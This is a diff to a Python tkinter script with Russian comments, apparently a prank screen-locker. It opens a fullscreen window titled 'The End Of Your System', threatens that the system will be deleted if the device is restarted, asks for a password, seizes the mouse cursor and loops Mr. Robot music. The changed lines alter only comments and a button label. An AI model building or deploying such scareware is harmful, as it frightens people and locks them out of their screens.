@@ -45,7 +45,7 @@ root.title("The End Of Your System")
 root.attributes("-fullscreen",True)
 
 # Ниже работа с изображением на фоне и настройки его отображения на весь экран
-photo = PhotoImage(file = r"C:\Users\111\Downloads\fs.png")
+photo = PhotoImage(file = r"C:\Users\111\Downloads\fs.png") # У вас своя директория с файлом
 w = photo.width()
 h = photo.height()
 root.geometry("%dx%d+0+0" % (w, h))
@@ -55,7 +55,7 @@ panel1.image = photo
 
 # Обьявление виджетов tkinter
 textfield=Entry(root,fg="green")
-but= Button(root,text="Разблокировать")
+but= Button(root,text="unlock")
 text=Label(root,text="tigerk00",font="System 10",fg="#32CD32",bg="black")
 text1=Label(root,text="Don't even think to turn off or restart your device - your system will delete immediately!",font = "System 25",fg="red",bg="black")
 l=Label(text=time,font="System 15", bg = 'black' ,  fg = 'white' )
@@ -80,7 +80,7 @@ pyautogui.moveTo(x = 900 , y = 520)
 
 # Вставил ost из Mr. Robot , звучит неплохо :)
 pygame.init()
-aud=pygame.mixer.Sound(r"C:\Users\111\Downloads\Mr.Robot - Main Theme Song.wav" )
+aud=pygame.mixer.Sound(r"C:\Users\111\Downloads\Mr.Robot - Main Theme Song.wav" )  # У вас своя директория с файлом
 aud.play(-1)                               # Сделал бесконечный цикл для песни (чтобы по окончании она начиналась заново)
 
 while stroke!=password:
